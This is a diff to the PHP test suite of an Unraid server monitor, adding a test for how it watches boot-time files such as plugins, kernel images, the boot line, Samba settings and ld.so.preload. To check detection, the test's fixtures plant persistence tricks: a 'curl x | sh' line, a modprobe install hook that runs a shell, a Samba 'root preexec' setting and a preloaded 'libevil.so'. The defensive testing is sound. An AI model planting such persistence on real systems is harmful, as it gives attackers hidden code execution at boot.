@@ -29586,6 +29586,166 @@ function testWatchmanPrivilegedStopped(): void
  * teaches a series
  */
 /**
+ * What runs at the start (watchman-boot.php, concept 11 F): plugin files on the flash, stop, modprobe.d, the start line,
+ * smb-extra.conf, the kernel files, /etc/ld.so.preload. His first look is normal; a plugin the plugin manager installed or
+ * updated (its link in /var/log/plugins as new as the file, or a plain file there with the same content) and kernel
+ * files of an Unraid update are quiet; a plugin or kernel file changed otherwise counts after two rounds in a row; the
+ * rest at once; removed is forgotten; a group not looked at keeps what was known; «I know, thanks» adopts the file.
+ */
+function testWatchmanStartFiles(): void
+{
+    $src = hardeningTmp('watch-start');
+    foreach (['flash/plugins', 'log-plugins', 'modprobe.d', 'syslinux', 'boot'] as $d) {
+        @mkdir("$src/$d", 0755, true);
+    }
+    $now = 1790000000;
+    $paths = ['plugins' => "$src/log-plugins", 'flash_plg' => "$src/flash/plugins", 'flash_stop' => "$src/stop", 'modprobe_d' => "$src/modprobe.d",
+              'start_cfg' => ['syslinux' => "$src/syslinux/syslinux.cfg", 'grub' => "$src/grub.cfg"], 'smb_extra' => "$src/smb-extra.conf",
+              'boot_dir' => "$src/boot", 'os_changes' => "$src/boot/changes.txt", 'ld_preload' => "$src/ld.so.preload"];
+    $plg = fn (string $name, string $v) => "<?xml version='1.0'?>\n<!DOCTYPE PLUGIN [\n<!ENTITY version \"$v\">\n]>\n"
+        . "<PLUGIN name=\"$name\" version=\"&version;\" pluginURL=\"https://raw.githubusercontent.com/someone/$name/main/$name.plg\">\n</PLUGIN>\n";
+    $put = function (string $file, string $text, int $t) {
+        file_put_contents($file, $text);
+        touch($file, $t);
+        clearstatcache();
+    };
+    // installed as Unraid does it: the flash's file, linked in /var/log/plugins at $t
+    $link = function (string $name, int $t) use ($src) {
+        @unlink("$src/log-plugins/$name.plg");
+        symlink("$src/flash/plugins/$name.plg", "$src/log-plugins/$name.plg");
+        exec('touch -h -t ' . date('YmdHi.s', $t) . ' ' . escapeshellarg("$src/log-plugins/$name.plg"));
+        clearstatcache();
+    };
+    $put("$src/flash/plugins/ca.plg", $plg('ca', '2026.11.01'), $now - 86400);
+    $link('ca', $now - 86000);
+    $put("$src/flash/plugins/unRAIDServer.plg", $plg('unRAIDServer', '7.2.0'), $now - 86400);
+    $link('unRAIDServer', $now - 86000);
+    $put("$src/syslinux/syslinux.cfg", "default menu.c32\nlabel Unraid OS\n  kernel /bzimage\n  append initrd=/bzroot\n", $now - 86400);
+    $put("$src/smb-extra.conf", "[global]\n   server min protocol = SMB3\n", $now - 86400);
+    $put("$src/boot/bzimage", str_repeat('k', 100), $now - 86400);
+    $put("$src/boot/bzroot", str_repeat('r', 200), $now - 86400);
+    $put("$src/boot/changes.txt", "# Version 7.2.0\n", $now - 86400);
+    $put("$src/modprobe.d/zfs.conf", "options zfs zfs_arc_max=8589934592\n", $now - 86400);
+
+    $look = watchmanBootLook($paths);
+    same('start: looked at — every group, the files by id, Unraid\'s version, the plugins installed', [
+        ['plg', 'stop', 'modprobe', 'start', 'smb_extra', 'kernel', 'preload'],
+        ['kernel:bzimage', 'kernel:bzroot', 'modprobe:zfs.conf', 'plg:ca', 'plg:unRAIDServer', 'smb_extra', 'start:syslinux'], '7.2.0', ['ca', 'unRAIDServer'],
+        ['initrd=/bzroot']],
+        [$look['looked'], array_keys($look['files']), $look['os'], array_keys($look['installed']), $look['files']['start:syslinux']['opts']]);
+    same('start: none of its paths — not looked at', null, watchmanBootLook(['plugins' => "$src/log-plugins"]));
+    $known = null;
+    $book = [];
+    $round = function (int $t, ?array $p = null) use (&$known, &$book, &$look, $paths): array {
+        $look = watchmanBootLook($p ?? $paths, $look);
+        return watchmanBootCompare($known, $look, $book, $t);
+    };
+    same('start: the first look is normal', [[], []], [$round($now), $book]);
+    same('start: the same again — nothing', [], $round($now + 300));
+    same('start: what he keeps — sizes, times, hashes, the start options; never a text, never the links', [true, false, false],
+        [isset($known['files']['plg:ca']['h']), str_contains(jsonEncode($known), 'SMB3'), isset($known['installed'])]);
+
+    // a plugin updated by the plugin manager: the file and its link at the same time — the plugin watch's business, quiet
+    $put("$src/flash/plugins/ca.plg", $plg('ca', '2026.11.20'), $now + 400);
+    $link('ca', $now + 401);
+    same('start: a plugin updated as Unraid does it — quiet, known at once', [[], [], '2026.11.20'], [$round($now + 600), $book, $known['files']['plg:ca']['v'] ?? null]);
+    // the same file edited by hand on the flash, its link older: counts in the second round
+    $link('ca', $now - 1000);           // installed long before (the link's time)
+    $put("$src/flash/plugins/ca.plg", $plg('ca', '2026.11.20') . "<!-- curl x | sh -->\n", $now + 700);
+    same('start: a plugin file changed on the flash, nothing installed it — not yet in the first round', [[], []], [$round($now + 900), $book]);
+    same('start: … in the second round in a row: flash_boot, the changed plugin', [['flash_boot'], 'flash_boot:plg:ca', 'flash_boot_plg_changed', 'ca.plg', true],
+        [$round($now + 1200), $book[0]['key'] ?? null, watchmanEntryVariant($book[0]), $book[0]['p']['file'] ?? null, $book[0]['p']['installed'] ?? null]);
+    same('start: … the next round: the same entry, nothing new', [[], 1], [$round($now + 1500), count($book)]);
+    // «I know, thanks»: the file as the round saw it is normal
+    $b = ['flash' => ['boot' => $known]];
+    watchmanBootAdopt($b, $book[0], ['flash' => ['boot' => $look]]);
+    $known = $b['flash']['boot'];
+    $book[0]['noted'] = $now + 1600;
+    same('start: «I know, thanks» — the file is normal, nothing new', [[], 1], [$round($now + 1800), count($book)]);
+
+    // a new plugin dropped on the flash, not installed: installed at the next start
+    $put("$src/flash/plugins/evil.plg", $plg('evil', '1'), $now + 1900);
+    $round($now + 2100);
+    $added = $round($now + 2400);
+    $e = end($book);
+    same('start: a plugin on the flash nothing installed — told in the second round', [['flash_boot'], 'flash_boot_plg', 'evil.plg', '1', false, true],
+        [$added, watchmanEntryVariant($e), $e['p']['file'], $e['p']['version'], $e['p']['installed'], $e['p']['new']]);
+    same('start: … in his words', ['file' => 'evil.plg', 'version' => '1', 'added' => '–', 'removed' => '–', 'exec' => '–'], watchmanBootText($e));
+    // … installed a moment later after all (the plugin manager): known quietly, his entry stays (what was there was real)
+    $link('evil', $now + 2500);
+    same('start: … installed after all — known, quiet', [[], true], [$round($now + 2700), isset($known['files']['plg:evil'])]);
+
+    // an Unraid update: the kernel files and Unraid's own plugin change together — quiet
+    $put("$src/boot/bzroot", str_repeat('R', 210), $now + 2800);
+    $put("$src/boot/changes.txt", "# Version 7.2.1\n", $now + 2800);
+    $put("$src/flash/plugins/unRAIDServer.plg", $plg('unRAIDServer', '7.2.1'), $now + 2800);
+    $link('unRAIDServer', $now + 2801);
+    $n = count($book);
+    same('start: an Unraid update — quiet', [[], $n, '7.2.1'], [$round($now + 3000), count($book), $known['os']]);
+    // a kernel file swapped without one: counts in the second round
+    $put("$src/boot/bzimage", str_repeat('x', 100), $now + 3100);
+    $round($now + 3300);
+    same('start: a kernel file changed without an update — flash_boot in the second round', [['flash_boot'], 'flash_boot_kernel', 'bzimage'],
+        [$round($now + 3600), watchmanEntryVariant(end($book)), end($book)['p']['file']]);
+
+    // the start line: what changed, at once
+    $put("$src/syslinux/syslinux.cfg", "default menu.c32\nlabel Unraid OS\n  kernel /bzimage\n  append initrd=/bzroot mitigations=off\n", $now + 3700);
+    $added = $round($now + 3900);
+    $e = end($book);
+    same('start: the start line changed — at once, the options named', [['flash_boot'], 'flash_boot_start', 'syslinux.cfg', ['mitigations=off'], []],
+        [$added, watchmanEntryVariant($e), $e['p']['file'], $e['p']['added'], $e['p']['removed']]);
+    same('start: GRUB\'s linux line — its options, not the kernel\'s file', ['boot=/dev/sda1', 'quiet'],
+        watchmanBootOpts("menuentry 'Unraid' {\n  linux /bzimage quiet boot=/dev/sda1\n  initrd /bzroot\n}\n"));
+    // stop, modprobe.d, smb-extra.conf: at once
+    $put("$src/stop", "#!/bin/bash\ncurl x | sh\n", $now + 4000);
+    $put("$src/modprobe.d/evil.conf", "install usb-storage /bin/sh -c 'x'\n", $now + 4000);
+    $put("$src/smb-extra.conf", "[global]\n   server min protocol = SMB3\n   root preexec = /tmp/x\n", $now + 4000);
+    $added = $round($now + 4200);
+    $by = [];
+    foreach ($book as $x) {
+        $by[$x['key']] = $x;
+    }
+    same('start: the shutdown script, a driver option file, Samba\'s extra settings — at once, Samba\'s program settings named',
+        [['flash_boot', 'flash_boot', 'flash_boot'], 'flash_boot_stop', 'flash_boot_modprobe', 'flash_boot_smb_extra', ['root preexec'], true],
+        [$added, watchmanEntryVariant($by['flash_boot:stop']), watchmanEntryVariant($by['flash_boot:modprobe:evil.conf']),
+         watchmanEntryVariant($by['flash_boot:smb_extra']), $by['flash_boot:smb_extra']['p']['exec'], $by['flash_boot:stop']['p']['new']]);
+    same('start: never a file\'s text in the entries (only the options and Samba\'s setting names)', [false, false],
+        [str_contains(jsonEncode($book), 'curl'), str_contains(jsonEncode($book), '/tmp/x')]);
+    // removed: safer — forgotten, nothing new
+    unlink("$src/modprobe.d/zfs.conf");
+    $n = count($book);
+    same('start: a file removed — forgotten quietly', [[], $n, false], [$round($now + 4500), count($book), isset($known['files']['modprobe:zfs.conf'])]);
+    // a group not looked at (the plugins at boot, before Unraid installed them): what was known stays
+    $p2 = array_diff_key($paths, ['flash_plg' => 1]);
+    $round($now + 4800, $p2);
+    same('start: the plugins not looked at — what was known about them stays', true, isset($known['files']['plg:ca'], $known['files']['plg:evil']));
+    // a file read only when its size or time changed
+    $before = $known['files']['smb_extra']['h'];
+    $put("$src/smb-extra.conf", "[global]\n   server min protocol = SMB3\n   root preexec = /tmp/y\n", $now + 4000);
+    $round($now + 5100);
+    same('start: a file the same in size and time isn\'t read again', $before, $known['files']['smb_extra']['h']);
+
+    // /etc/ld.so.preload: shouldn't be there — new: ld_preload, its names
+    file_put_contents("$src/ld.so.preload", "# x\n/usr/lib/libevil.so\n");
+    clearstatcache();
+    $added = $round($now + 5400);
+    $e = end($book);
+    same('start: /etc/ld.so.preload appears — ld_preload with what it loads', [['ld_preload'], 'ld_preload', ['/usr/lib/libevil.so'], ['names' => '/usr/lib/libevil.so']],
+        [$added, $e['kind'], $e['p']['names'], watchmanBootText($e)]);
+    same('start: the kinds — flash_boot with the flash, ld_preload the server itself; both told, their techniques',
+        ['flash', 'host', true, true, 'T1037', 'T1574.006'],
+        [watchmanCatOf('flash_boot'), watchmanCatOf('ld_preload'), WATCH_KINDS['flash_boot'][1], WATCH_KINDS['ld_preload'][1],
+         WATCH_ATTACK['flash_boot'], WATCH_ATTACK['ld_preload']]);
+    // every shape of the entry has its words in every language (testStrings checks the five agree)
+    $en = langFile(OFFICE_WEB . '/desks/watchman/lang/en.json');
+    same('start: every shape of the entry has its words', [], array_values(array_filter(array_map(fn ($e) => 'entry.' . (watchmanEntryVariant($e) ?? $e['kind']), $book),
+        fn ($k) => !isset($en[$k]))));
+    // the round's paths and the night's: all of them looked at in the night (the flash and /etc are its ground)
+    same('start: the round looks at them, the night shift too', [[], []],
+        [array_values(array_diff(array_keys(watchmanBootPaths()), array_keys(watchmanPaths()))), array_values(array_diff(array_keys(watchmanBootPaths()), array_keys(watchmanNightPaths())))]);
+}
+
+/**
  * The night watchman's look at the host (SOC, 1.30): listeners from ss, accounts in RAM, logs emptied outside their
  * rotation, programs from scratch folders (a stand-in /proc of links), the office's own schedule lines, ATT&CK ids.
  */
@@ -67587,7 +67747,7 @@ function testSkipPlaces(): void
 $parts = ['logic' => ['testCron', 'testRetention', 'testPlanGone', 'testSnapPlansTolerant', 'testSnapPlanIdNeverReused', 'testSleepingPools', 'testSnapshotNames', 'testJack', 'testJackPlan', 'testJackNoPython', 'testJackRun', 'testJackStructure', 'testJackWatch', 'testJackSizes', 'testJackShareDataset', 'testJackPool', 'testJackImport', 'testJackForeign', 'testOfficeCron', 'testCaretakerCronLook', 'testMenuName', 'testSetupListDiff', 'testNoScriptNames', 'testPhpVarNames', 'testDetailsKept', 'testSetupDiscard', 'testWhereArrayZfs', 'testEstimates', 'testBackupFirstUpload', 'testBackupRough', 'testNotify', 'testNotifyLayout', 'testNotifyCenter', 'testCaretakerAcks', 'testAckContent', 'testCaretakerAckDrift', 'testJackLetGo', 'testJackMover', 'testJackGatherCache', 'testJackRsync', 'testJackTidyDisks', 'testJackUpstream', 'testJackPersons', 'testJackNotInBudget', 'testJackProgress', 'testJackReadyShares',
                       'testLogsFlood',
                       'testMoverelliFit', 'testMoverelliIni', 'testMoverelliIniTolerant', 'testMoverelliMoveBin', 'testMoverelliRun', 'testMoverelliGates', 'testMoverelliForeign', 'testMoverelliPage', 'testRefusedRowWords', 'testMoverelliImport', 'testNightPlan', 'testNightRun', 'testJackChaos', 'testNightOrder', 'testNightHerPool', 'testNightPicture', 'testMoverelliRunPicture', 'testNightJackCard', 'testNightJackInHerCard', 'testNightSteps', 'testNightReserve', 'testNightSnaps', 'testPoolJackOutside', 'testPoolNonZfs', 'testMoverelliSharesGone', 'testMoverelliTiles', 'testMoverelliSuggestJack', 'testMoverelliUnraid', 'testMoverelliUnraidProgress', 'testMoverelliStop', 'testMoverelliArrayStop', 'testMoverelliPowerCut', 'testMoverelliNothingMoved', 'testMoverelliCardLag', 'testMoverelliCardFile', 'testMoverelliLeftWhy', 'testMoverelliSyncMoved', 'testMoverelliTwins', 'testMoverelliEta', 'testMoverelliPreferDisks', 'testMoverelliTidy', 'testMoverelliShareRoot', 'testMoverelliTrailingSpace', 'testMoverelliFuture', 'testMoverelliLeftCodesPage', 'testOfficeFmtSize', 'testMoverelliIdleRules', 'testMoverelliPageTruth', 'testMoverJackTruthRest', 'testGreetTruth', 'testMoverelliFill', 'testPoolLevel', 'testPoolBytes', 'testStreamerTab', 'testJackRemoveServer', 'testJackSaveReconnect', 'testJackConnectNoChange', 'testJackByWords', 'testStreamerBudget', 'testStreamerReset', 'testStreamerFix3', 'testDialogSeen', 'testStreamerShares', 'testJackYield',
-                      'testBackupPackages', 'testBackupKopiaItems', 'testBackupKopiaSplitTags', 'testBackupKopiaWord', 'testBackupNewLocal', 'testBackupNewLocalOffice', 'testBackupPlace', 'testSetupUnfold', 'testSetupFilter', 'testSetupTiles', 'testSetupFirstPlace', 'testBackupPlaceOffer', 'testSetupAsleepKept', 'testSetupGoneApp', 'testSetupStoppedKept', 'testSetupNoDocker', 'testSetupBom', 'testSetupDupKey', 'testSetupUntrusted', 'testSetupKopiaGone', 'testSetupDockerOffKeeps', 'testSetupOldUserScript', 'testSetupPoolGone', 'testBackupPresets', 'testBackupSkip', 'testBackupVmOrder', 'testBackupVmWarn', 'testBackupBtrfsBrake', 'testPartnerAtOnce', 'testBackupArrayStop', 'testBackupPruneOwn', 'testBackupKopiaAutostart', 'testBackupKopiaOrder', 'testAgentBackupHooks', 'testBackupRecoverNotes', 'testDataTrust', 'testBackupScheduledUnset', 'testBackupNotifyLang', 'testBackupNotifyItems', 'testNotifyPlain', 'testJackStreamerName', 'testRetentionPartner', 'testOfficeHome', 'testBackupEpipe', 'testBackupPartnerPhase', 'testBackupInside', 'testBackupPartnerOffice', 'testBackupReview172', 'testBackupFlashNever', 'testPartnerEnded', 'testBackupAnewChoice', 'testPartnerStaleName', 'testBackupAsleep', 'testBackupAsleepOffice', 'testIcons', 'testIconSquare', 'testRestore', 'testRestoreJobs', 'testRestoreRunCard', 'testJobStale', 'testJobSilentRuns', 'testNoWallWaits', 'testRestoreVmFit', 'testRestoreVmForeign', 'testRestoreStack', 'testSetupMakeDataset', 'testSetupMakeFolder', 'testRestoreShares', 'testRestoreSnapsHold', 'testRestorePaths', 'testRestoreBrowse', 'testRestoreNextcloud', 'testRestoreFindings', 'testRestoreDatabases', 'testRestoreDbStopped', 'testRestoreNames', 'testRestoreInUse', 'testRestoreSettled', 'testRestoreUnfinished', 'testRestoreArrayStopWhy', 'testRestoreMeasuring', 'testRestorePutbackDb', 'testRestoreConfigNoTemplate', 'testRestoreDrill', 'testDrillSqliteAppIndex', 'testDrillShareFile', 'testDrillImageData', 'testSnapRead', 'testDrillSnapRead', 'testRenameFree', 'testRestorePartner', 'testRestoreMoveGuide', 'testPartnerTicket', 'testPartnerDoorDocs', 'testPartnerRepair', 'testPartnerStart', 'testWatchmanTicket', 'testPartnerSendBack', 'testWatchmanPartner', 'testWatchmanNet', 'testWatchmanNetIpsFamilies', 'testWatchmanNetMikrotik', 'testSnapshotPartner', 'testSnapshotBusy', 'testVmOrphans', 'testCleanupPartner', 'testLogsPartner', 'testAdvisor', 'testAdvisorDockerOff', 'testAdvisorInstall', 'testAdvisorOldTemplate', 'testAdvisorRecord', 'testAdvisorObjectLock', 'testAdvisorPartnerGuide', 'testLogsTour', 'testTruthLogsWatch', 'testLogsRules', 'testLogsPlugins', 'testLogsMine', 'testLogsFilters', 'testLogsFiltersPage', 'testWatchWakesPage', 'testWatchmanWakes', 'testWatchmanWakeTrail', 'testMetrics', 'testWatchmanCats', 'testWatchman', 'testWatchmanGone', 'testWatchmanSerious', 'testWatchmanTeamLeadOne', 'testWatchmanSeriousUndo', 'testWatchmanAtUserScript', 'testWatchmanSched', 'testWatchmanOffice', 'testWatchmanOwnCron', 'testWatchmanFlow', 'testWatchmanFlowPull', 'testWatchmanFlowGone', 'testWatchmanFlowFiles', 'testWatchmanPosture', 'testWatchmanPrivilegedStopped', 'testWatchmanSnaps', 'testWatchmanHost', 'testWatchmanNight', 'testWatchmanBoot', 'testNightUi', 'testJobGuard', 'testComposeBuilds', 'testUnraidPath', 'testExclusive', 'testWatchmanGoLines', 'testWatchmanFlowSources', 'testWatchmanNetMikrotikBook', 'testAdvisorMikrotikGuide', 'testDashboardJobs', 'testBackupKopiaOrphans', 'testBackupOldSourcesPage', 'testKopiaEmptied', 'testKopiaEmptiedCache', 'testBackupFutureFiles', 'testKopiaLockGuard', 'testBackup74Polish', 'testBackupAppShare', 'testSetupLeftUnsaved', 'testTipNeverKept', 'testSilentControlsMore', 'testBackupAsleepNoMust', 'testSetupUnknownKey', 'testBackupVolumeCache', 'testBackupGonePackage', 'testBackupMovedPackage', 'testSetupApplyHonest', 'testSetupViaShare', 'testSetupTravelPicture', 'testBackupTruthProtection', 'testBackupTruthShares', 'testBackupResults', 'testRestoreTruthChips', 'testSetupOwnDatasetApply', 'testBackupNcOpen', 'testBackupPausedStopped', 'testSetupSearch', 'testBackupPlaceVerdict', 'testWatchmanFlowGuess', 'testWatchmanGuessMore', 'testBackupLastRunEnded', 'testOffsiteReach', 'testDockerSilent', 'testKopiaHang', 'testKopiaWatch', 'testWatchmanHold', 'testBackupBatchH', 'testBackupRetention',
+                      'testBackupPackages', 'testBackupKopiaItems', 'testBackupKopiaSplitTags', 'testBackupKopiaWord', 'testBackupNewLocal', 'testBackupNewLocalOffice', 'testBackupPlace', 'testSetupUnfold', 'testSetupFilter', 'testSetupTiles', 'testSetupFirstPlace', 'testBackupPlaceOffer', 'testSetupAsleepKept', 'testSetupGoneApp', 'testSetupStoppedKept', 'testSetupNoDocker', 'testSetupBom', 'testSetupDupKey', 'testSetupUntrusted', 'testSetupKopiaGone', 'testSetupDockerOffKeeps', 'testSetupOldUserScript', 'testSetupPoolGone', 'testBackupPresets', 'testBackupSkip', 'testBackupVmOrder', 'testBackupVmWarn', 'testBackupBtrfsBrake', 'testPartnerAtOnce', 'testBackupArrayStop', 'testBackupPruneOwn', 'testBackupKopiaAutostart', 'testBackupKopiaOrder', 'testAgentBackupHooks', 'testBackupRecoverNotes', 'testDataTrust', 'testBackupScheduledUnset', 'testBackupNotifyLang', 'testBackupNotifyItems', 'testNotifyPlain', 'testJackStreamerName', 'testRetentionPartner', 'testOfficeHome', 'testBackupEpipe', 'testBackupPartnerPhase', 'testBackupInside', 'testBackupPartnerOffice', 'testBackupReview172', 'testBackupFlashNever', 'testPartnerEnded', 'testBackupAnewChoice', 'testPartnerStaleName', 'testBackupAsleep', 'testBackupAsleepOffice', 'testIcons', 'testIconSquare', 'testRestore', 'testRestoreJobs', 'testRestoreRunCard', 'testJobStale', 'testJobSilentRuns', 'testNoWallWaits', 'testRestoreVmFit', 'testRestoreVmForeign', 'testRestoreStack', 'testSetupMakeDataset', 'testSetupMakeFolder', 'testRestoreShares', 'testRestoreSnapsHold', 'testRestorePaths', 'testRestoreBrowse', 'testRestoreNextcloud', 'testRestoreFindings', 'testRestoreDatabases', 'testRestoreDbStopped', 'testRestoreNames', 'testRestoreInUse', 'testRestoreSettled', 'testRestoreUnfinished', 'testRestoreArrayStopWhy', 'testRestoreMeasuring', 'testRestorePutbackDb', 'testRestoreConfigNoTemplate', 'testRestoreDrill', 'testDrillSqliteAppIndex', 'testDrillShareFile', 'testDrillImageData', 'testSnapRead', 'testDrillSnapRead', 'testRenameFree', 'testRestorePartner', 'testRestoreMoveGuide', 'testPartnerTicket', 'testPartnerDoorDocs', 'testPartnerRepair', 'testPartnerStart', 'testWatchmanTicket', 'testPartnerSendBack', 'testWatchmanPartner', 'testWatchmanNet', 'testWatchmanNetIpsFamilies', 'testWatchmanNetMikrotik', 'testSnapshotPartner', 'testSnapshotBusy', 'testVmOrphans', 'testCleanupPartner', 'testLogsPartner', 'testAdvisor', 'testAdvisorDockerOff', 'testAdvisorInstall', 'testAdvisorOldTemplate', 'testAdvisorRecord', 'testAdvisorObjectLock', 'testAdvisorPartnerGuide', 'testLogsTour', 'testTruthLogsWatch', 'testLogsRules', 'testLogsPlugins', 'testLogsMine', 'testLogsFilters', 'testLogsFiltersPage', 'testWatchWakesPage', 'testWatchmanWakes', 'testWatchmanWakeTrail', 'testMetrics', 'testWatchmanCats', 'testWatchman', 'testWatchmanGone', 'testWatchmanSerious', 'testWatchmanTeamLeadOne', 'testWatchmanSeriousUndo', 'testWatchmanAtUserScript', 'testWatchmanSched', 'testWatchmanOffice', 'testWatchmanOwnCron', 'testWatchmanFlow', 'testWatchmanFlowPull', 'testWatchmanFlowGone', 'testWatchmanFlowFiles', 'testWatchmanPosture', 'testWatchmanPrivilegedStopped', 'testWatchmanSnaps', 'testWatchmanHost', 'testWatchmanStartFiles', 'testWatchmanNight', 'testWatchmanBoot', 'testNightUi', 'testJobGuard', 'testComposeBuilds', 'testUnraidPath', 'testExclusive', 'testWatchmanGoLines', 'testWatchmanFlowSources', 'testWatchmanNetMikrotikBook', 'testAdvisorMikrotikGuide', 'testDashboardJobs', 'testBackupKopiaOrphans', 'testBackupOldSourcesPage', 'testKopiaEmptied', 'testKopiaEmptiedCache', 'testBackupFutureFiles', 'testKopiaLockGuard', 'testBackup74Polish', 'testBackupAppShare', 'testSetupLeftUnsaved', 'testTipNeverKept', 'testSilentControlsMore', 'testBackupAsleepNoMust', 'testSetupUnknownKey', 'testBackupVolumeCache', 'testBackupGonePackage', 'testBackupMovedPackage', 'testSetupApplyHonest', 'testSetupViaShare', 'testSetupTravelPicture', 'testBackupTruthProtection', 'testBackupTruthShares', 'testBackupResults', 'testRestoreTruthChips', 'testSetupOwnDatasetApply', 'testBackupNcOpen', 'testBackupPausedStopped', 'testSetupSearch', 'testBackupPlaceVerdict', 'testWatchmanFlowGuess', 'testWatchmanGuessMore', 'testBackupLastRunEnded', 'testOffsiteReach', 'testDockerSilent', 'testKopiaHang', 'testKopiaWatch', 'testWatchmanHold', 'testBackupBatchH', 'testBackupRetention',
                       'testWhereAfterWatchman', 'testWhereVmStop', 'testWhereVmMigratable', 'testWhereTunables', 'testBackupSparse', 'testWhereTakeOver', 'testWhereDesk', 'testWhereProtectionTruth', 'testWhereCronTruth', 'testWhereMoverAdvice', 'testSpace', 'testWhereMap', 'testCleanupSizesUnknown', 'testArrayStoppedDataDir', 'testWhereBuilding', 'testCleanupTick', 'testCleanupJobCap', 'testCleanupJobSameResult', 'testStaffMerged', 'testStaffOrder', 'testHireWith', 'testHireNeeds', 'testMovedDesk', 'testMigrateJackId', 'testMigrateMediaCache', 'testMigrateWakes', 'testSupporter', 'testLeftovers', 'testOfficeLanguage', 'testThemeSwitch', 'testSizeSwitch', 'testApiLook', 'testLookPage', 'testLookOldRun', 'testUpdateNotice', 'testReportDialog', 'testSearchPlaces', 'testSearchItems', 'testSearchGuides', 'testApiGzip', 'testFlashDownload', 'testWatchmanApiDoor', 'testCaretakerApi', 'testCaretakerNetworks', 'testSetupMessages', 'testDriftCodes', 'testIconStacks', 'testPartnerPairing', 'testPartnerUsonetSimple', 'testPartnerAddress', 'testPartnerWatch', 'testPartnerGone', 'testPartnerRelease', 'testPartnerUnits', 'testPartnerTolerant', 'testMigrate', 'testBackupReplan', 'testBackupPairsReplan', 'testUnraidTested', 'testCronBack', 'testPlgGuard', 'testCleanEnv', 'testPlgInstall', 'testWatchmanRoundWait', 'testPlgRemove', 'testBackupLetGo', 'testBackupAbortAsked', 'testJackSetupFresh', 'testApiGetOffline', 'testSupporterList', 'testReportDialogImages', 'testReportDialogDiagnostics', 'testReportDialogOwnWords', 'testReportDialogDesk',
                       'testRestoreReviewPaths', 'testRestoreSharesTick', 'testBackupSharesTick', 'testBackupRunEnded', 'testRestoreGapsPage', 'testRestoreGapsAgent', 'testRestoreGapsSwap', 'testRestoreShareUnlisted', 'testRestoreGapsLibvirt', 'testRestoreReviewJob', 'testRestoreReviewForeign', 'testRestoreReviewPeek',
                       'testFlockShfs', 'testBackupOneMinute', 'testStrictSettings', 'testRestoreClientEcho', 'testWatchBookView', 'testWatchFilter', 'testWatchBookNoteSome', 'testWatchmanAtPlugin', 'testWatchmanAtLeft', 'testWatchmanBootNoise', 'testWatchmanAtOnce', 'testWatchmanAtTold', 'testParityWhy', 'testCleanupVolumes', 'testHiddenStoreroom', 'testFilterWords', 'testFilterBar', 'testOfficeJobScheduleNext', 'testBackupTiles', 'testBackupPartnerEta', 'testJackLastRunDuringRun', 'testJackListLost', 'testJackPoolTileBudget', 'testJackThemes', 'testSnapPoolSplit', 'testTruthRestPages', 'testSnapArrayDisks', 'testTilesMediaPages', 'testCleanupInUseLocked', 'testCleanupOrphanDatasets', 'testPlaceReadersNoSettings', 'testCleanupSnapOnly', 'testCleanupSnapKept', 'testCleanupDrillCopies', 'testStaleShares', 'testSkipPlaces', 'testCleanupSkipGreeting', 'testCleanupTiles', 'testRestoreTiles', 'testTilesConvention', 'testSections', 'testDeskPages', 'testScheduleTile', 'testTourSchedules', 'testUsoNetPin', 'testUsoNetRule', 'testUsoNetStatus', 'testFanboyLook'],
